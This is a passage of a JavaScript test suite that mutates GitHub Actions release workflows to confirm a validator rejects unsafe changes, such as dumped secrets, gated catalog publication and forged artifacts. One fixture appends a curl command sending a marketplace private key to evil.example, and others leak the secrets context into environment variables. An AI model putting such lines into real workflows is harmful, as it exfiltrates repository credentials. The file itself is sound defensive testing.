      workflow.on.workflow_call.secrets = { MARKETPLACE_APP_ID: { required: true } };
    }],
    ["the entire secret context is dumped into the catalog step", workflow => {
      catalogStep(workflow).env.LEAK = "${{ toJSON(secrets) }}";
    }],
    ["a secret is read by bracket index instead of by dot", workflow => {
      smokeStep(workflow).env.LEAK = "${{ secrets['MARKETPLACE_APP_PRIVATE_KEY'] }}";
    }],
    ["the publish job exfiltrates a bracket-indexed secret", workflow => {
      const step = draftStep(workflow.jobs.publish, "Publish the plugin release");
      step.run = `${step.run}\ncurl -d "\${{ secrets['MARKETPLACE_APP_PRIVATE_KEY'] }}" https://evil.example\n`;
    }],
    ["the context is spelled in the other case GitHub expressions accept", workflow => {
      smokeStep(workflow).env.LEAK = "${{ SECRETS.MARKETPLACE_APP_ID }}";
    }],
    ["a secret hides in a bare list element rather than a mapping value", workflow => {
      workflow.jobs["post-publish-smoke"].strategy = {
        matrix: { leak: ["${{ secrets.MARKETPLACE_APP_PRIVATE_KEY }}"] },
      };
    }],
    ["the token step mints from a credential nobody scoped", workflow => {
      tokenStep(workflow).with["private-key"] = "${{ secrets['SOME_OTHER_KEY'] }}";
    }],
    ["the token step's own read moves to a step that only borrows its name", workflow => {
      const job = marketplaceJob(workflow);
      job.steps.push(structuredClone(tokenStep(workflow)));
    }],
  ];
  for (const [name, mutate] of mutations) {
    await t.test(name, () => {
      const workflows = loadWorkflows();
      mutate(workflows.get(file));
      assert.match(validateWorkflows(workflows).join("\n"), forbidden);
    });
  }
});

test("the plugin lane still forbids building, signing, and forwarded secrets", async (t) => {
  assert.deepEqual(validateWorkflows(loadWorkflows()), []);
  const mutations = [
    ["auto-release forwards secrets to the plugin lane", workflows => {
      workflows.get("auto-release.yml").jobs["plugin-release"].secrets = "inherit";
    }, /auto-release\.yml must route the plugin lane without forwarding secrets/u],
    ["the plugin lane reaches for Apple signing material", workflows => {
      draftStep(
        workflows.get("plugin-release.yml").jobs["marketplace-publish"],
        "Point the catalog at the published release",
      ).env.APPLE_ID = "signing@example.com";
    }, /must never reference Apple signing material/u],
    ["the plugin lane builds native code", workflows => {
      const step = draftStep(
        workflows.get("plugin-release.yml").jobs["plugin-proof"],
        "Provision the pinned CLI end to end",
      );
      step.run = `${step.run}\ncargo build --locked -p codestory-cli\n`;
    }, /must not build native code/u],
  ];
  for (const [name, mutate, expected] of mutations) {
    await t.test(name, () => {
      const workflows = loadWorkflows();
      mutate(workflows);
      const violations = validateWorkflows(workflows);
      assert.notDeepEqual(violations, []);
      assert.match(violations.join("\n"), expected);
    });
  }
});

test("every lane that reads job annotations holds the checks: read scope", async (t) => {
  // The recovery path was inert in production because none of the three permission blocks that
  // govern the annotations call granted `checks: read`. The live repository now does, in all three
  // -- including auto-release.yml, the lane that actually publishes.
  const workflows = loadWorkflows();
  assert.deepEqual(annotationScopeViolations(workflows), []);
  assert.equal(workflows.get("release.yml").permissions.checks, "read");
  assert.equal(workflows.get("lost-runner-rerun.yml").permissions.checks, "read");
  assert.equal(workflows.get("auto-release.yml").jobs.release.permissions.checks, "read");

  const mutations = [
    ["release.yml loses the scope", live => {
      delete live.get("release.yml").permissions.checks;
    }, /release\.yml job accelerator-non-claim .*checks: read/u],
    ["auto-release.yml loses the scope", live => {
      delete live.get("auto-release.yml").jobs.release.permissions.checks;
    }, /auto-release\.yml job release .*checks: read/u],
    ["lost-runner-rerun.yml loses the scope", live => {
      delete live.get("lost-runner-rerun.yml").permissions.checks;
    }, /lost-runner-rerun\.yml job rerun-lost-jobs .*checks: read/u],
    // A job-level block replaces the workflow-level one, so a narrower job grant is a real loss.
    ["a job-level block drops the scope", live => {
      live.get("release.yml").jobs["accelerator-non-claim"].permissions = {
        actions: "read",
        contents: "read",
      };
    }, /release\.yml job accelerator-non-claim .*checks: read/u],
    ["write is not read", live => {
      live.get("release.yml").permissions.checks = "write";
    }, /release\.yml job accelerator-non-claim .*checks: read/u],
  ];
  for (const [name, mutate, expected] of mutations) {
    await t.test(name, () => {
      const live = loadWorkflows();
      mutate(live);
      const violations = annotationScopeViolations(live);
      assert.notDeepEqual(violations, []);
      assert.match(violations.join("\n"), expected);
      // The whole gate must refuse too, not only the isolated predicate.
      assert.notDeepEqual(validateWorkflows(live), []);
    });
  }
});

test("the closeout collects the lost-runner evidence itself and publishes from the ledger", async (t) => {
  assert.deepEqual(validateWorkflows(loadWorkflows()), []);
  const mutations = [
    // The trust boundary that decides proof-versus-non-claim must not inherit the producer's
    // verdict, so the closeout's own producer-map call carries evidence it collected.
    ["pre-publish closeout stops collecting its own evidence", live => {
      const step = live.get("release.yml").jobs["pre-publish-closeout"].steps
        .find(({ name }) => name === "Authenticate pre-publish Actions provenance");
      step.run = step.run
        .replace(/\s*bash \.github\/scripts\/collect-actions-job-evidence\.sh[^\n]*\n[^\n]*\n/u, "\n")
        .replace(/\s*--job-evidence [^\n]*\n/u, "\n");
    }, /must contain --job-evidence|collect-actions-job-evidence/u],
    ["post-publish closeout stops collecting its own evidence", live => {
      const step = live.get("release.yml").jobs["post-publish-closeout"].steps
        .find(({ name }) => name === "Authenticate post-publish Actions provenance");
      step.run = step.run.replace(/\s*--job-evidence [^\n]*\n/u, "\n");
    }, /--job-evidence/u],
    // Release notes rendered from the static graph are how a withheld accelerator was still
    // announced as supported.
    ["release notes rendered without the ledger", live => {
      const step = live.get("release.yml").jobs.publish.steps
        .find(({ name }) => name === "Compose versioned GitHub release notes");
      step.run = step.run.replace(/ \\\n\s*--ledger [^\n]*/u, "");
    }, /--ledger target\/release-closeout\/pre_publish\/ledger\.json/u],
    ["the accepted ledger is never downloaded", live => {
      const job = live.get("release.yml").jobs.publish;
      job.steps = job.steps.filter(({ name }) => name !== "Download the accepted pre-publish closeout");
    }, /Download the accepted pre-publish closeout/u],
    // The ledger the README points readers at has to reach a release consumer.
    ["the closeout summary stops shipping", live => {
      const job = live.get("release.yml").jobs.publish;
      job.steps = job.steps
        .filter(({ name }) => name !== "Ship the accepted closeout summary with the release");
    }, /Ship the accepted closeout summary with the release/u],
    ["a rejected closeout is shipped anyway", live => {
      const step = live.get("release.yml").jobs.publish.steps
        .find(({ name }) => name === "Ship the accepted closeout summary with the release");
      step.run = step.run.replace(/\s*test "\$\(jq -r \.decision "\$summary"\)" = accept\n/u, "\n");
    }, /= accept/u],
  ];
  for (const [name, mutate, expected] of mutations) {
    await t.test(name, () => {
      const live = loadWorkflows();
      mutate(live);
      const violations = validateWorkflows(live);
      assert.notDeepEqual(violations, []);
      assert.match(violations.join("\n"), expected);
    });
  }
});

test("lost-runner recovery stays automatic, bounded, and blind to job names", () => {
  const graph = loadReleaseClaimGraph(root);
  const rerunFile = "lost-runner-rerun.yml";

  // Both halves agree on the same live repository shape today.
  assert.deepEqual(lostRunnerRecoveryViolations(loadWorkflows(), graph), []);
  assert.equal(MAXIMUM_RUN_ATTEMPTS, graph.non_claim_policy.maximum_run_attempts);
  assert.equal(LOST_RUNNER_ANNOTATION, graph.non_claim_policy.annotation);

  const mutations = [
    // Recovery that waits on a human is the failure this workflow exists to remove.
    ["approval-gated rerun", workflows => {
      workflows.get(rerunFile).jobs["rerun-lost-jobs"].environment = "release-recovery";
    }],
    ["approval-gated non-claim", workflows => {
      workflows.get("release.yml").jobs["accelerator-non-claim"].environment = "release-recovery";
    }],
    // Re-running every failed job would sweep an assertion failure along with the lost one.
    ["blanket failed-job rerun", workflows => {
      const step = workflows.get(rerunFile).jobs["rerun-lost-jobs"].steps
        .find(({ name }) => name === "Re-dispatch only the lost jobs");
      step.run = step.run.replace(
        "actions/jobs/$job_id/rerun",
        "actions/runs/$FAILED_RUN_ID/rerun-failed-jobs",
      );
    }],
    ["ungated re-dispatch", workflows => {
      delete workflows.get(rerunFile).jobs["rerun-lost-jobs"].steps
        .find(({ name }) => name === "Re-dispatch only the lost jobs").if;
    }],
    ["unclassified re-dispatch", workflows => {
      const job = workflows.get(rerunFile).jobs["rerun-lost-jobs"];
      job.steps = job.steps.filter(({ name }) => name !== "Plan the bounded rerun");
    }],
    ["rerun on every conclusion", workflows => {
      delete workflows.get(rerunFile).jobs["rerun-lost-jobs"].if;
    }],
    ["missing release observation", workflows => {
      workflows.get(rerunFile).on.workflow_run.workflows = ["Auto Release"];
    }],
    ["broadened recovery permissions", workflows => {
      workflows.get(rerunFile).permissions.contents = "write";
    }],
    // The withheld-claim producer must decide from the classifier, not from a red proof job.
    ["unclassified non-claim", workflows => {
      const job = workflows.get("release.yml").jobs["accelerator-non-claim"];
      job.steps = job.steps.filter(({ name }) => name !== "Decide withheld accelerator hosts");
    }],
    ["unconditional non-claim cells", workflows => {
      delete workflows.get("release.yml").jobs["accelerator-non-claim"].steps
        .find(({ name }) => name === "Record populated accelerator non-claims").if;
    }],
    ["non-claim upload for a host that reported", workflows => {
      workflows.get("release.yml").jobs["accelerator-non-claim"].steps
        .find(({ with: options }) => String(options?.name ?? "")
          .startsWith("release-cell-nonclaim-prepublish-linux-x64-vulkan")).if = "always()";
    }],
    // One container per closeout phase: a phase's producer map authorizes only the manifests it
    // selected, so a container carrying another phase's cell is rejected at download time.
    ["phase-mixed non-claim container", workflows => {
      workflows.get("release.yml").jobs["accelerator-non-claim"].steps
        .find(({ with: options }) => String(options?.name ?? "")
          .startsWith("release-cell-nonclaim-postpublish-linux-x64-vulkan"))
        .with.path = "target/release-non-claim/cells/linux-x64-vulkan";
    }],
    ["closeout ignores the non-claim outcome", workflows => {
      const job = workflows.get("release.yml").jobs["pre-publish-closeout"];
      job.if = job.if.replace(
        " && (needs.accelerator-non-claim.result == 'success' || needs.accelerator-non-claim.result == 'skipped')",
        "",
      );
    }],
    ["non-claim skips the accelerator hosts", workflows => {
      workflows.get("release.yml").jobs["accelerator-non-claim"].needs = ["preflight", "packaged-proof"];
    }],
    ["non-claim producer job renamed away from the graph", workflows => {
      workflows.get("release.yml").jobs["accelerator-non-claim"].name = "Skip accelerator proof";
    }],
    ["forged withheld cell producer", workflows => {
      workflows.get("release.yml").jobs.publish.steps.push({
        name: "Upload forged withheld cell",
        uses: "actions/upload-artifact@v7.0.1",
        with: {
          name: "release-cell-nonclaim-prepublish-linux-x64-vulkan-attempt-${{ github.run_attempt }}",
          path: "forged.json",
        },
      });
    }],
  ];
  for (const [label, mutate] of mutations) {
    const workflows = loadWorkflows();
    mutate(workflows);
    assert.notDeepEqual(validateWorkflows(workflows), [], label);
  }

  // A recovery bound that drifts from the release claim graph is caught even when the workflows
  // are untouched: the two numbers are the same fact.
  const drifted = structuredClone(graph);
  drifted.non_claim_policy.maximum_run_attempts = 5;
  assert.notDeepEqual(lostRunnerRecoveryViolations(loadWorkflows(), drifted), []);
  const rephrased = structuredClone(graph);
  rephrased.non_claim_policy.annotation = "The runner went away.";
  assert.notDeepEqual(lostRunnerRecoveryViolations(loadWorkflows(), rephrased), []);
});

// Catalog publication is delivery, not a release gate. Relaxing a gate is exactly where a vacuous
// pass gets built by accident, so these tests attack the three shapes that would produce one: a
// claim that becomes true on its own, a smoke that passes because it stopped checking anything,
// and a retry that hides which failure actually happened.
function runStepBash(run, environment) {
  const directory = mkdtempSync(path.join(os.tmpdir(), "codestory-catalog-delivery-"));
  const output = path.join(directory, "github-output");
  const summary = path.join(directory, "github-step-summary");
  writeFileSync(output, "");
  writeFileSync(summary, "");
  const executable = process.platform === "win32" ? "wsl.exe" : "bash";
  const args = process.platform === "win32"
    ? ["--exec", "/bin/bash", "-c", run]
    : ["-c", run];
  const result = spawnSync(executable, args, {
    cwd: root,
    encoding: "utf8",
    env: {
      ...process.env,
      GITHUB_OUTPUT: output,
      GITHUB_STEP_SUMMARY: summary,
      GITHUB_WORKSPACE: root,
      RUNNER_TEMP: directory,
      ...environment,
    },
  });
  const outputs = Object.fromEntries(
    readFileSync(output, "utf8")
      .split(/\r?\n/u)
      .filter(line => line.includes("="))
      .map(line => [line.slice(0, line.indexOf("=")), line.slice(line.indexOf("=") + 1)]),
  );
  return { ...result, outputs, summary: readFileSync(summary, "utf8") };
}

// Both lanes tag irreversibly and then point the catalog at what they published, so both are
// exercised here rather than only the one the issue named.
const catalogOutcomeLanes = [
  ["release.yml", "marketplace-publish"],
  ["plugin-release.yml", "marketplace-publish"],
];
const catalogStateLanes = [
  ["post-publish-release-smoke.yml", "smoke"],
  ["plugin-release.yml", "post-publish-smoke"],
];

function runCatalogDeliveryOutcome(environment, [file, jobName] = catalogOutcomeLanes[0]) {
  const step = draftStep(loadWorkflows().get(file).jobs[jobName], "Record catalog delivery outcome");
  // Every GitHub expression in this step lives in env, so the body is executable bash.
  assert.ok(!step.run.includes("${{"), "delivery outcome body must not embed workflow expressions");
  return runStepBash(step.run, { RECOVERY_WORKFLOW: step.env.RECOVERY_WORKFLOW, ...environment });
}

function runCatalogDeliveryState(environment, [file, jobName] = catalogStateLanes[0]) {
  const step = draftStep(loadWorkflows().get(file).jobs[jobName], "Record catalog delivery state");
  assert.ok(!step.run.includes("${{"), "delivery state body must not embed workflow expressions");
  // PUBLISHED_COMMIT is what the preceding step resolved from the published release. It is the
  // step's own input here, exactly as it is in the workflow.
  return runStepBash(step.run, environment);
}

// Both smokes bind themselves to the published release before deciding anything, so the executable
// body below is run with that binding present -- and, separately, with it broken.
function runCatalogDeliveryStateBound(environment, lane) {
  return runCatalogDeliveryState({ PUBLISHED_COMMIT: repositoryHead(), ...environment }, lane);
}

function repositoryHead() {
  return spawnSync("git", ["-C", root, "rev-parse", "HEAD"], { encoding: "utf8" }).stdout.trim();
}

test("a release records catalog publication only when the catalog push actually landed", () => {
  const revision = "a".repeat(40);

  for (const lane of catalogOutcomeLanes) {
    const published = runCatalogDeliveryOutcome({
      TOKEN_OUTCOME: "success",
      PUBLISH_OUTCOME: "success",
      PUBLISHED_REVISION: revision,
    }, lane);
    assert.equal(published.status, 0, published.stderr);
    assert.deepEqual(published.outputs, {
      catalog_published: "true",
      marketplace_revision: revision,
    }, lane.join("/"));
    assert.doesNotMatch(published.stdout, /::warning::/u, lane.join("/"));
  }

  // Each of these is a real way this job has failed or could fail. None may report published, and
  // none may fail the release: the tag and the GitHub release already exist by this point.
  const deferrals = [
    ["missing credential", { TOKEN_OUTCOME: "failure", PUBLISH_OUTCOME: "", PUBLISHED_REVISION: "" }],
    ["push rejected", { TOKEN_OUTCOME: "success", PUBLISH_OUTCOME: "failure", PUBLISHED_REVISION: "" }],
    ["push skipped", { TOKEN_OUTCOME: "failure", PUBLISH_OUTCOME: "skipped", PUBLISHED_REVISION: "" }],
    ["push reported success without a revision", {
      TOKEN_OUTCOME: "success",
      PUBLISH_OUTCOME: "success",
      PUBLISHED_REVISION: "",
    }],
    ["push reported a mutable ref", {
      TOKEN_OUTCOME: "success",
      PUBLISH_OUTCOME: "success",
      PUBLISHED_REVISION: "main",
    }],
    ["push reported a truncated revision", {
      TOKEN_OUTCOME: "success",
      PUBLISH_OUTCOME: "success",
      PUBLISHED_REVISION: "a".repeat(39),
    }],
  ];
  for (const lane of catalogOutcomeLanes) {
    for (const [label, environment] of deferrals) {
      const deferred = runCatalogDeliveryOutcome(environment, lane);
      const where = `${lane.join("/")}: ${label}`;
      assert.equal(deferred.status, 0, `${where}: ${deferred.stderr}`);
      assert.deepEqual(deferred.outputs, {
        catalog_published: "false",
        marketplace_revision: "",
      }, where);
      assert.match(deferred.stdout, /::warning::Catalog publication deferred/u, where);
      assert.match(deferred.stdout, /marketplace-sync\.yml/u, where);
      assert.match(deferred.summary, /DEFERRED/u, where);
    }
  }
});

test("the post-publish smoke cannot record a public catalog install it did not perform", () => {
  const graph = loadReleaseClaimGraph(root);
  const { states } = graph.workflow_policy.catalog_delivery;
  const publishedInstaller = states.find(({ id }) => id === "published").installer;
  const deferredInstaller = states.find(({ id }) => id === "deferred").installer;
  const liveRevision = "b".repeat(40);
  const head = repositoryHead();

  for (const lane of catalogStateLanes) {
    const where = lane.join("/");
    const published = runCatalogDeliveryStateBound({
      CATALOG_PUBLISHED: "true",
      INPUT_MARKETPLACE_REVISION: liveRevision,
    }, lane);
    assert.equal(published.status, 0, published.stderr);
    assert.equal(published.outputs.state, "published", where);
    assert.equal(published.outputs.installer, publishedInstaller, where);
    assert.equal(published.outputs.marketplace_source, "TheGreenCedar/AgentPluginMarketplace", where);
    assert.equal(published.outputs.marketplace_revision, liveRevision, where);
    assert.equal(published.outputs.local_fixture, "false", where);

    // Deferred still proves a real Codex install of the real published artifacts -- it changes only
    // WHICH catalog served it -- and it says so with an installer identity that cannot be confused
    // for the public one.
    const deferred = runCatalogDeliveryStateBound({
      CATALOG_PUBLISHED: "false",
      INPUT_MARKETPLACE_REVISION: "",
    }, lane);
    assert.equal(deferred.status, 0, deferred.stderr);
    assert.equal(deferred.outputs.state, "deferred", where);
    assert.equal(deferred.outputs.installer, deferredInstaller, where);
    assert.notEqual(deferred.outputs.installer, publishedInstaller, where);
    assert.notEqual(deferred.outputs.marketplace_source, "TheGreenCedar/AgentPluginMarketplace", where);
    assert.equal(deferred.outputs.local_fixture, "true", where);
    assert.match(deferred.outputs.marketplace_revision, /^[0-9a-f]{40}$/u, where);
    assert.match(deferred.stdout, /::warning::Catalog publication was deferred/u, where);
    const catalog = JSON.parse(readFileSync(
      path.join(deferred.outputs.marketplace_source, ".agents", "plugins", "marketplace.json"),
      "utf8",
    ));
    assert.equal(catalog.plugins[0].source.sha, head, `${where}: fixture must pin the released commit`);

    // Refusals. A handoff that is inconsistent, absent, or merely truthy-looking must stop the
    // smoke rather than fall through into the published identity.
    for (const [label, environment] of [
      ["deferred with a live revision", { CATALOG_PUBLISHED: "false", INPUT_MARKETPLACE_REVISION: liveRevision }],
      ["absent handoff", { CATALOG_PUBLISHED: "", INPUT_MARKETPLACE_REVISION: "" }],
      ["truthy handoff", { CATALOG_PUBLISHED: "TRUE", INPUT_MARKETPLACE_REVISION: liveRevision }],
      ["handoff spelled yes", { CATALOG_PUBLISHED: "yes", INPUT_MARKETPLACE_REVISION: liveRevision }],
      // Published demands an IMMUTABLE revision. "main" is refused by any length test at all, so
      // it never exercised immutability; the 40-character non-hex cases below do, and they are
      // reachable in practice because this workflow is dispatchable with an arbitrary string.
      ["published without a revision", { CATALOG_PUBLISHED: "true", INPUT_MARKETPLACE_REVISION: "" }],
      ["published with a mutable ref", { CATALOG_PUBLISHED: "true", INPUT_MARKETPLACE_REVISION: "main" }],
      ["published with a truncated revision", {
        CATALOG_PUBLISHED: "true",
        INPUT_MARKETPLACE_REVISION: "b".repeat(39),
      }],
      ["published with forty non-hex characters", {
        CATALOG_PUBLISHED: "true",
        INPUT_MARKETPLACE_REVISION: "z".repeat(40),
      }],
      ["published with a forty-character branch name", {
        CATALOG_PUBLISHED: "true",
        INPUT_MARKETPLACE_REVISION: "refs/heads/some-quite-long-branch-name-xy",
      }],
      ["published with an uppercase revision", {
        CATALOG_PUBLISHED: "true",
        INPUT_MARKETPLACE_REVISION: "B".repeat(40),
      }],
    ]) {
      const refused = runCatalogDeliveryStateBound(environment, lane);
      assert.notEqual(refused.status, 0, `${where}: ${label}`);
      assert.notEqual(refused.outputs.installer, publishedInstaller, `${where}: ${label}`);
    }

    // The deferred branch pins the commit the previous step resolved from the published release.
    // A missing or non-immutable binding must stop the job rather than fall back to this tree.
    for (const [label, publishedCommit] of [
      ["absent published commit", ""],
      ["mutable published ref", "main"],
      ["forty non-hex characters", "z".repeat(40)],
    ]) {
      const refused = runCatalogDeliveryState({
        CATALOG_PUBLISHED: "false",
        INPUT_MARKETPLACE_REVISION: "",
        PUBLISHED_COMMIT: publishedCommit,
      }, lane);
      assert.notEqual(refused.status, 0, `${where}: ${label}`);
      assert.equal(refused.outputs.installer, undefined, `${where}: ${label}`);
    }
  }
});

test("catalog publication cannot be reinstated as a gate or claimed without happening", async (t) => {
  assert.deepEqual(validateWorkflows(loadWorkflows()), []);

  const releaseFile = "release.yml";
  const smokeFile = "post-publish-release-smoke.yml";
  const pluginFile = "plugin-release.yml";
  const publishJob = workflows => workflows.get(releaseFile).jobs["marketplace-publish"];
  const smokeJob = workflows => workflows.get(smokeFile).jobs.smoke;
  const smokeCall = workflows => workflows.get(releaseFile).jobs["post-publish-smoke"];
  const pluginPublishJob = workflows => workflows.get(pluginFile).jobs["marketplace-publish"];
  const pluginSmokeJob = workflows => workflows.get(pluginFile).jobs["post-publish-smoke"];

  const mutations = [
    // --- The claim silently becoming true ---
    ["release hard-codes the catalog claim", workflows => {
      smokeCall(workflows).with.catalog_published = true;
    }, /must derive catalog_published from the recorded marketplace-publish outcome/u],
    ["release hard-codes the catalog claim as a string", workflows => {
      smokeCall(workflows).with.catalog_published = "true";
    }, /must derive catalog_published from the recorded marketplace-publish outcome/u],
    ["catalog claim is read from an unrelated input", workflows => {
      smokeCall(workflows).with.catalog_published = "${{ inputs.publish_release }}";
    }, /must derive catalog_published from the recorded marketplace-publish outcome/u],
    ["catalog claim is read from the job result instead of the recorded outcome", workflows => {
      smokeCall(workflows).with.catalog_published
        = "${{ needs.marketplace-publish.result == 'success' }}";
    }, /must derive catalog_published from the recorded marketplace-publish outcome/u],
    ["catalog claim is dropped entirely", workflows => {
      delete smokeCall(workflows).with.catalog_published;
    }, /must derive catalog_published from the recorded marketplace-publish outcome/u],
    ["delivery outcome ignores whether the push ran", workflows => {
      const step = draftStep(publishJob(workflows), "Record catalog delivery outcome");
      step.run = step.run.replace('&& [ "$PUBLISH_OUTCOME" = "success" ] \\\n', "");
    }, /must run \[ "\$PUBLISH_OUTCOME" = "success" \]/u],
    ["delivery outcome accepts any revision the push printed", workflows => {
      const step = draftStep(publishJob(workflows), "Record catalog delivery outcome");
      step.run = step.run.replace(
        `&& printf '%s' "$PUBLISHED_REVISION" | grep -Eq '^[0-9a-f]{40}$'`,
        "&& true",
      );
    }, /grep -Eq/u],
    ["delivery outcome defaults to published", workflows => {
      const step = draftStep(publishJob(workflows), "Record catalog delivery outcome");
      step.run = step.run.replace("catalog_published=false", "catalog_published=true");
    }, /must run catalog_published=false/u],
    ["job publishes the raw push result instead of the recorded outcome", workflows => {
      publishJob(workflows).outputs.catalog_published = "${{ steps.publish.outcome == 'success' }}";
    }, /must publish the recorded delivery state/u],
    ["delivery outcome is skipped when the push failed", workflows => {
      draftStep(publishJob(workflows), "Record catalog delivery outcome").if = "success()";
    }, /catalog delivery outcome must be recorded whatever the catalog push did/u],
    ["deferred publication stops naming its recovery path", workflows => {
      delete draftStep(publishJob(workflows), "Record catalog delivery outcome").env.RECOVERY_WORKFLOW;
    }, /must name marketplace-sync\.yml as the recovery path/u],

    // --- The smoke passing because it stopped checking anything ---
    ["deferred smoke records the public catalog installer", workflows => {
      const step = draftStep(smokeJob(workflows), "Emit authenticated post-publish release cells");
      step.run = step.run.replace(
        '--arg installer "$DELIVERED_INSTALLER"',
        "--arg installer codex_marketplace_install",
      );
    }, /must not hard-code the published installer identity/u],
    ["both delivery states collapse onto one installer identity", workflows => {
      const step = draftStep(smokeJob(workflows), "Record catalog delivery state");
      step.run = step.run.replace(
        "installer=codex_marketplace_deferred_fixture",
        "installer=codex_marketplace_install",
      );
    }, /published installer identity must be reachable only from the published branch/u],
    ["deferred branch accepts a live catalog revision", workflows => {
      const step = draftStep(smokeJob(workflows), "Record catalog delivery state");
      step.run = step.run.replace('if [ -n "$INPUT_MARKETPLACE_REVISION" ]; then', "if false; then");
    }, /must run if \[ -n "\$INPUT_MARKETPLACE_REVISION" \]/u],
    ["unknown delivery states fall through instead of failing", workflows => {
      const step = draftStep(smokeJob(workflows), "Record catalog delivery state");
      step.run = step.run.replace("catalog_published must be true or false", "unreachable");
    }, /must run catalog_published must be true or false/u],
    ["delivery state becomes conditional", workflows => {
      draftStep(smokeJob(workflows), "Record catalog delivery state").if = "inputs.catalog_published";
    }, /catalog delivery state must be unconditional and fail closed/u],
    ["delivery state stops reading the caller's handoff", workflows => {
      delete draftStep(smokeJob(workflows), "Record catalog delivery state").env.CATALOG_PUBLISHED;
    }, /must read the recorded publication handoff/u],
    ["smoke resolves whatever catalog it likes", workflows => {
      const step = draftStep(smokeJob(workflows), "Resolve the published plugin through the marketplace catalog");
      step.run = step.run.replace(
        '--marketplace-source "$MARKETPLACE_SOURCE"',
        "--marketplace-source TheGreenCedar/AgentPluginMarketplace",
      );
    }, /must run --marketplace-source "\$MARKETPLACE_SOURCE"/u],
    // The other half of the same claim: the variable the command names has to be bound to the
    // delivery state's own output, or routing it through `env:` would only move the hole.
    ["smoke rebinds the catalog source away from the delivery state", workflows => {
      draftStep(smokeJob(workflows), "Resolve the published plugin through the marketplace catalog")
        .env.MARKETPLACE_SOURCE = "TheGreenCedar/AgentPluginMarketplace";
    }, /must bind MARKETPLACE_SOURCE to \$\{\{ steps\.delivery\.outputs\.marketplace_source \}\}/u],
    ["smoke fakes the fixture catalog by cloning it", workflows => {
      draftStep(smokeJob(workflows), "Record catalog delivery state").run
        += "\ngit clone https://github.com/TheGreenCedar/AgentPluginMarketplace.git";
    }, /must not fabricate installation with git clone/u],
    ["catalog delivery state stops being a required handoff", workflows => {
      workflows.get(smokeFile).on.workflow_call.inputs.catalog_published.required = false;
    }, /workflow_call catalog_published must be a required boolean/u],

    // --- The gate coming back, or a retry hiding which failure happened ---
    ["token failure fails the published release again", workflows => {
      delete draftStep(publishJob(workflows), "Mint a scoped marketplace token")["continue-on-error"];
    }, /marketplace token failure must not fail an already-published release/u],
    ["catalog push failure fails the published release again", workflows => {
      delete draftStep(publishJob(workflows), "Point the catalog at the published release")["continue-on-error"];
    }, /catalog push must run only with a minted token and must not fail the release/u],
    ["catalog push runs without a minted token", workflows => {
      delete draftStep(publishJob(workflows), "Point the catalog at the published release").if;
    }, /catalog push must run only with a minted token and must not fail the release/u],
    ["smoke waits for the catalog job to succeed", workflows => {
      smokeCall(workflows).if
        = "inputs.publish_release && needs.marketplace-publish.result == 'success'";
    }, /must not gate on marketplace-publish in any form/u],
    ["smoke is skipped whenever the catalog job did not run cleanly", workflows => {
      smokeCall(workflows).if = "inputs.publish_release";
    }, /post-publish smoke must require trusted publication authority and a successful publish/u],
    ["smoke stops requiring a real published release", workflows => {
      smokeCall(workflows).if = "always() && inputs.publish_release && needs.preflight.result == 'success'";
    }, /post-publish smoke must require trusted publication authority and a successful publish/u],
    ["catalog push retries until it passes", workflows => {
      const step = draftStep(publishJob(workflows), "Point the catalog at the published release");
      step.run = `until node .github/scripts/publish-marketplace-catalog.mjs; do sleep 5; done\n${step.run}`;
    }, /must not retry a recorded delivery outcome/u],
    ["post-publish closeout reintroduces the catalog gate through its condition", workflows => {
      workflows.get(releaseFile).jobs["post-publish-closeout"].if
        = "inputs.publish_release && needs.marketplace-publish.result == 'success'";
    }, /post-publish closeout must not gate on marketplace-publish succeeding/u],

    // --- The plugin fast lane, which tags and publishes the same catalog ---
    ["plugin lane token failure fails its tagged release again", workflows => {
      delete draftStep(pluginPublishJob(workflows), "Mint a scoped marketplace token")["continue-on-error"];
    }, /plugin-release\.yml marketplace token failure must not fail an already-published release/u],
    ["plugin lane catalog push failure fails its tagged release again", workflows => {
      delete draftStep(pluginPublishJob(workflows), "Point the catalog at the published release")["continue-on-error"];
    }, /plugin-release\.yml catalog push must run only with a minted token/u],
    ["plugin lane stops recording its delivery outcome", workflows => {
      const job = pluginPublishJob(workflows);
      job.steps = job.steps.filter(({ name }) => name !== "Record catalog delivery outcome");
    }, /plugin-release\.yml must contain named step Record catalog delivery outcome/u],
    ["plugin lane delivery outcome defaults to published", workflows => {
      const step = draftStep(pluginPublishJob(workflows), "Record catalog delivery outcome");
      step.run = step.run.replace("catalog_published=false", "catalog_published=true");
    }, /plugin-release\.yml step Record catalog delivery outcome must run catalog_published=false/u],
    ["plugin lane smoke waits for the catalog job to succeed", workflows => {
      pluginSmokeJob(workflows).if = "needs.marketplace-publish.result == 'success'";
    }, /plugin-release\.yml post-publish smoke must require a successful publish without gating/u],
    ["plugin lane smoke stops requiring a real published release", workflows => {
      delete pluginSmokeJob(workflows).if;
    }, /plugin-release\.yml post-publish smoke must require a successful publish without gating/u],
    ["plugin lane hard-codes its catalog claim", workflows => {
      draftStep(pluginSmokeJob(workflows), "Record catalog delivery state").env.CATALOG_PUBLISHED = "true";
    }, /plugin-release\.yml catalog delivery state must read the recorded publication handoff/u],
    ["plugin lane collapses both delivery states onto one installer identity", workflows => {
      const step = draftStep(pluginSmokeJob(workflows), "Record catalog delivery state");
      step.run = step.run.replace(
        "installer=codex_marketplace_deferred_fixture",
        "installer=codex_marketplace_install",
      );
    }, /plugin-release\.yml the published installer identity must be reachable only from the published branch/u],
    ["plugin lane deferred branch accepts a live catalog revision", workflows => {
      const step = draftStep(pluginSmokeJob(workflows), "Record catalog delivery state");
      step.run = step.run.replace('if [ -n "$INPUT_MARKETPLACE_REVISION" ]; then', "if false; then");
    }, /plugin-release\.yml step Record catalog delivery state must run if \[ -n "\$INPUT_MARKETPLACE_REVISION" \]/u],
    ["plugin lane installs from a catalog the delivery state did not resolve", workflows => {
      const step = draftStep(pluginSmokeJob(workflows), "Prove the public marketplace install path");
      step.run = step.run.replace(
        '--marketplace-source "$MARKETPLACE_SOURCE"',
        "--marketplace-source TheGreenCedar/AgentPluginMarketplace",
      );
    }, /plugin-release\.yml step Prove the public marketplace install path must run --marketplace-source/u],
    ["plugin lane rebinds the catalog source away from the delivery state", workflows => {
      draftStep(pluginSmokeJob(workflows), "Prove the public marketplace install path")
        .env.MARKETPLACE_SOURCE = "TheGreenCedar/AgentPluginMarketplace";
    }, /plugin-release\.yml step Prove the public marketplace install path must bind MARKETPLACE_SOURCE/u],
    ["plugin lane smoke installs the revision the job failed to publish", workflows => {
      draftStep(pluginSmokeJob(workflows), "Prove the public marketplace install path")
